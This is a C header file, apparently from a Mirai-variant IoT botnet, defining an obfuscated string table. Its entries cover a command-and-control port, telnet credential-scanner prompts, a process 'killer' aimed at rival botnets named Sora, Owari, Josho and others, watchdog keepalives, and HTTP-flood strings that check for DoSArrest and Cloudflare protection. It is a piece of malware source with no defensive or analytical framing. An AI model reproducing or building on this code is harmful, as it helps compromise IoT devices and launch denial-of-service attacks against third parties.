#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value
{
    char *val;
    uint16_t val_len;

    #ifdef DEBUG
        BOOL locked;
    #endif
};

#define TABLE_CNC_PORT 1
#define TABLE_SCAN_CB_PORT 2
#define TABLE_EXEC_SUCCESS 3

#define TABLE_SCAN_SHELL 4
#define TABLE_SCAN_ENABLE 5
#define TABLE_SCAN_SYSTEM 6
#define TABLE_SCAN_SH 7
#define TABLE_SCAN_QUERY 8
#define TABLE_SCAN_RESP 9
#define TABLE_SCAN_NCORRECT 10
#define TABLE_SCAN_PS 11
#define TABLE_SCAN_KILL_9 12
#define TABLE_SCAN_OGIN 13
#define TABLE_SCAN_ENTER 14
#define TABLE_SCAN_ASSWORD 15

#define TABLE_KILLER_PROC 16
#define TABLE_KILLER_EXE 17
#define TABLE_KILLER_FD 18
#define TABLE_KILLER_MAPS 19
#define TABLE_KILLER_TCP 20


#define TABLE_EXEC_MIRAI 21
#define TABLE_EXEC_MANA 22
#define TABLE_EXEC_SORA1 23
#define TABLE_EXEC_SORA2 24
#define TABLE_EXEC_SORA3 25
#define TABLE_EXEC_OWARI 26
#define TABLE_EXEC_JOSHO 27
#define TABLE_EXEC_APOLLO 28
#define TABLE_EXEC_HOHO 29
#define TABLE_EXEC_ARES 30
#define TABLE_EXEC_YAKUZA 31
#define TABLE_EXEC_APEX 32
#define TABLE_EXEC_OWARI2 33
#define TABLE_EXEC_HITOLEAKED 34
#define TABLE_EXEC_HORIZON 35
#define TABLE_EXEC_HOHO2 36
#define TABLE_EXEC_GEMINI 37
#define TABLE_EXEC_HYBRID 38
#define TABLE_EXEC_SATAN 39
#define TABLE_EXEC_ORPHIC 40
#define TABLE_EXEC_ZAPON 41
#define TABLE_EXEC_OBBO 42
#define TABLE_EXEC_MYTH 43
#define TABLE_EXEC_ASHER 44
#define TABLE_EXEC_KALON 45
#define TABLE_EXEC_YUKARI 46
#define TABLE_EXEC_GREEKS 47
#define TABLE_EXEC_RAZOR 48

#define TABLE_IOCTL_KEEPALIVE1 49
#define TABLE_IOCTL_KEEPALIVE2 50
#define TABLE_IOCTL_KEEPALIVE3 51
#define TABLE_IOCTL_KEEPALIVE4 52


#define TABLE_ATK_SET_COOKIE            		53  // "setCookie('"
#define TABLE_ATK_REFRESH_HDR           		54  // "refresh:"
#define TABLE_ATK_LOCATION_HDR          		55  // "location:"
#define TABLE_ATK_SET_COOKIE_HDR        		56  // "set-cookie:"
#define TABLE_ATK_CONTENT_LENGTH_HDR    		57  // "content-length:"
#define TABLE_ATK_TRANSFER_ENCODING_HDR 		58  // "transfer-encoding:"
#define TABLE_ATK_CHUNKED               		59  // "chunked"
#define TABLE_ATK_KEEP_ALIVE_HDR        		60  // "keep-alive"
#define TABLE_ATK_CONNECTION_HDR        		61  // "connection:"
#define TABLE_ATK_DOSARREST             		62  // "server: dosarrest"
#define TABLE_ATK_CLOUDFLARE_NGINX      		63  // "server: cloudflare-nginx"

#define TABLE_ATK_KEEP_ALIVE            		64  /* "Connection: keep-alive" */
#define TABLE_ATK_ACCEPT                		65  // "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" // */
#define TABLE_ATK_ACCEPT_LNG            		66  // "Accept-Language: en-US,en;q=0.8"
#define TABLE_ATK_CONTENT_TYPE          		67  // "Content-Type: application/x-www-form-urlencoded"
#define TABLE_ATK_HTTP                    		68  // "HTTP/1.1"
#define TABLE_ATK_USERAGENT             		69  // "User-Agent:"
#define TABLE_ATK_HOST                   		70  // "Host:"
#define TABLE_ATK_COOKIE                		71  // "Cookie:"
#define TABLE_ATK_SEARCHHTTP            		72  // "http"
#define TABLE_ATK_URL                   		73  // "url="
#define TABLE_ATK_POST                  		74  // "POST"

#define TABLE_RANDOM							75
#define TABLE_ATK_VSE 							76
#define TABLE_ATK_RESOLVER						77
#define	TABLE_ATK_NSERV							78



#define TABLE_MAX_KEYS 79

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
